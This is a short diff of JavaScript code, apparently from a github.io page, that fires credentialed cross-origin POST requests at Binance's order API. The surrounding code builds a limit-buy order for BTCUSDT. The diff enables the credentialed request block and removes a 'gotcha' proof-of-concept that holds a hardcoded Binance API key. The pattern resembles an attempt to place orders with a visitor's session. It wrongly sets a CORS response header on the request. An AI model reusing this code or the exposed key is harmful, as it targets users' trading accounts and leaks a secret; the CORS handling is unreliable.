@@ -586,7 +586,7 @@ xhr.send("symbol=BTCUSDT&side=BUY&type=LIMIT&quantity=1.2&recvWindow=60000&price
 */
 
 
-/*
+
 var xmlhttp_test = new XMLHttpRequest();
     var url = "https://api.binance.com/api/v3/order";
 
@@ -599,17 +599,11 @@ var xmlhttp_test = new XMLHttpRequest();
     };
     xmlhttp_test.open("POST", url, true);
     xmlhttp_test.withCredentials = true; 
-    xmlhttp_test.setRequestHeader("Access-Control-Allow-Origin", "https://cryptochancla.github.io/app/");
+    xmlhttp_test.setRequestHeader("Access-Control-Allow-Origin", "https://cryptochancla.github.io");
     xmlhttp_test.send(null);
-*/
+
  
-function gotcha() { location=url }
-var req = new XMLHttpRequest();
-url = 'https://api.binance.com/api/v3/order'; // beware of mixed content blocking when targeting HTTP sites
-req.onload = gotcha;
-req.open('POST', url, true);
-req.setRequestHeader("X-MBX-APIKEY", "Hu3CLKGBt23TibLaoRMIiKmsql0hGMt4agzxaxww0lrKdOX9b0mOSX7GSPW4qYw3")
-req.send();
+
 
 
 
